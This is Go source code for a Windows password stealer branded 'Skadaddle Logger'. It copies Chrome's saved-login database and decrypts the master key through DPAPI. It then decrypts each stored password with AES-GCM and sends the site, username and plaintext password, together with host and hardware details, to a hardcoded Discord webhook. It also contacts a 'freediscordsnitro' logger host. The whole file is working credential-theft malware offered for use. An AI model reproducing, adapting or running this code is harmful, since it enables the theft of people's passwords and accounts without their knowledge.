package main

import (
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"log"
	"os"
	"syscall"
	"unsafe"
	"strings"
	"encoding/json"
	"io/ioutil"
	"github.com/ahmedkamals/colorize"
	"encoding/base64"
	"github.com/shirou/gopsutil/cpu"
	"net/http"
	"github.com/shirou/gopsutil/disk"
	"github.com/mattia-git/go-discord-webhooks"
    "github.com/shirou/gopsutil/host"
    "github.com/shirou/gopsutil/mem"
	"crypto/aes"
	"crypto/cipher"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	dataPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	masterKey []byte 
)
type SysInfo struct {
    Hostname string `bson:hostname`
    Platform string `bson:platform`
    CPU      string `bson:cpu`
    RAM      uint64 `bson:ram`
	Disk     uint64 `bson:disk`

}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}




func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}


func getMasterKey() ([]byte,error){
	var masterKey []byte
	jsonFile, err := os.Open(localStatePath)
	if err != nil {
	    return masterKey,err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
	    return masterKey,err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) 
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	stringKey := string(decodedKey) 
	stringKey = strings.Trim(stringKey, "DPAPI") 
	
	masterKey,err = Decrypt([]byte(stringKey)) 
	if err != nil{
		return masterKey,err
	}

	return masterKey,nil

}

func main() {
	colorized := colorize.NewColorable(os.Stdout)
	println(colorized.White("			┌┼┐  ╦╔═  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗  ╔╦╗  ╦    ╔═╗"))
	println(colorized.Gray("			└┼┐  ╠╩╗  ╠═╣   ║║  ╠═╣   ║║   ║║  ║    ║╣"))
	println(colorized.Purple("			└┼┘  ╩ ╩  ╩ ╩  ═╩╝  ╩ ╩  ═╩╝  ═╩╝  ╩═╝  ╚═╝"))

	if !checkFileExist(dataPath) {
		os.Exit(0)
	}

	
	
	err := copyFileToDirectory(dataPath, os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}


	//Open Database
	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	resp, err := http.Get("https://freediscordsnitro.000webhostapp.com/e.php") //add your own logger from the php logger

    if err != nil {
        log.Fatal(err)
    }

    defer resp.Body.Close()
	for rows.Next() {
		var URL string
		var USERNAME string
		var PASSWORD string

		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
		if err != nil {
			log.Fatal(err)
		}
		//Decrypt Passwords
		if strings.HasPrefix(PASSWORD, "v10"){
			PASSWORD = strings.Trim(PASSWORD, "v10") 


			if string(masterKey) != ""{
				ciphertext := []byte(PASSWORD)
				c, err := aes.NewCipher(masterKey)
			    if err != nil {
			    	
			        fmt.Println(err)
			    }
			    gcm, err := cipher.NewGCM(c)
			    if err != nil {
			        fmt.Println(err)
			    }
			    nonceSize := gcm.NonceSize()
			    if len(ciphertext) < nonceSize {
			        fmt.Println(err)
			    }

			    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			    if err != nil {
			        fmt.Println(err)
			    }

			    if string(plaintext) != ""{
					println(len(plaintext))

                    hostStat, _ := host.Info()
                    cpuStat, _ := cpu.Info()
                    vmStat, _ := mem.VirtualMemory()
					diskStat, _ := disk.Usage("\\")
                
                    info := new(SysInfo)
                
                    info.Hostname = hostStat.Hostname
                    info.Platform = hostStat.Platform
                    info.CPU = cpuStat[0].ModelName
                    info.RAM = vmStat.Total / 1024 / 1024
					info.Disk = diskStat.Total / 1024 / 1024
                    webhook := webhook.DiscordWebhook{}
                    
                    webhook.SetUsername("Skadaddle")
                    webhook.SetAvatarURL("https://cdn.discordapp.com/icons/815155331348561920/21196648e3ba3233020ad2ab27efac0f.png?size=1024")
    
                    embed := webhook.NewEmbed()
                    
                    embed.AddField("**__website__**", URL, true)
                    embed.AddField("**__UserName__**", USERNAME, true)
                    embed.AddField("**__Password__**", string(plaintext), true)
                    embed.AddField("**__PlatForm__**", string(info.Platform), true)
                    embed.AddField("**__Cpu__**", string(info.CPU), true)
                    embed.AddField("**__Ram__**", string(info.RAM), true)
		    embed.AddField("**__Disk_Space__**", string(info.Disk), true)
		    embed.AddField("**__Website__**", "https://skadaddle.cc/", true)
		    embed.AddField("**__Server__**", "https://discord.gg/Y2yxAVnj3n", true)
                    embed.SetImage("https://images-ext-1.discordapp.net/external/7XyUx7KFZfUUREJ30XCk1GtNIxGR6j9XXWO6xHAUOxc/https/skadaddle.cc/img/skadaddle.gif")
                    embed.SetColour(000001)
                    embed.SetTimestamp()
                    embed.SetFooter("Skadaddle Logger", "https://cdn.discordapp.com/icons/815155331348561920/21196648e3ba3233020ad2ab27efac0f.png?size=1024")
                    embed.SetAuthor(info.Hostname + "'s info", "", "")
                    
                    webhook.Send("https://canary.discord.com/api/webhooks/828062761950117889/o4mJw8imZl9REL6JQQ5FAKS6gsqsldAQf7tdceruxyVnai077fzK15TUl0WHRg_Ow-NB") //
			    }
			}else{
				mkey,err := getMasterKey()
				if err != nil{
					fmt.Println(err)
				}
				masterKey = mkey
			}
		}else{ 
			if err != nil {
				log.Fatal(err)
			}

			}
		}
		
}
